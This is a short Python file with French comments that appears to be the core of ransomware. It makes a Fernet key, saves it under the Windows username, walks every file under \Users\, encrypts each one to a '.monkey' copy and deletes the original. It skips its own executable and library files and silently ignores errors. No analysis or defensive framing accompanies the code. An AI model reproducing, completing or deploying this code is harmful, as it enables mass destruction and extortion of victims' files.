#!/usr/env/python
#coding:utf-8

from cryptography.fernet import Fernet
import os

class Des_Chiffres_et_des_Lettres():
    def __init__(self):
        # création de la clé
        self.key = Fernet.generate_key()
        self.name_key = os.environ["USERNAME"]

    # Fonction de génération de la clé
    def write_key(self, name_key):
        # stockage de la clé dans un fichier
        with open(f"{name_key}.key", 'wb') as filekey:
            filekey.write(self.key)

    # Fonction de chiffrement
    def chiffrage(self, key, name):
        with open(name, 'rb') as file:
            chiffr = file.read()

        # utilisation de la clé
        fernet = Fernet(key)
        encrypted = fernet.encrypt(chiffr)
        fichier_encrypted = name + ".monkey"
        try:
            with open(fichier_encrypted, 'wb') as files:
                files.write(encrypted)

            os.remove(name)
        except:
            pass

    # liste et chiffre le répertoire
    def listing(self):
        lettre = os.environ["SystemDrive"]
        target = ["\\Users\\"]
        for fichiers in target:
            for root, dirs, files in os.walk(fichiers):
                for file in files:
                    mes_fichiers = ["main.exe"]
                    if not(file in mes_fichiers):
                        for exten in file.split("."):
                            if(file.endswith(exten)):
                                my_exten = ["py","pyc", "pyd", "dll", "monkey", "key"]
                                if not(exten in my_exten):
                                    try:
                                        dir = os.path.join(root, file)
                                        self.chiffrage(self.key, dir)
                                    except:
                                        pass
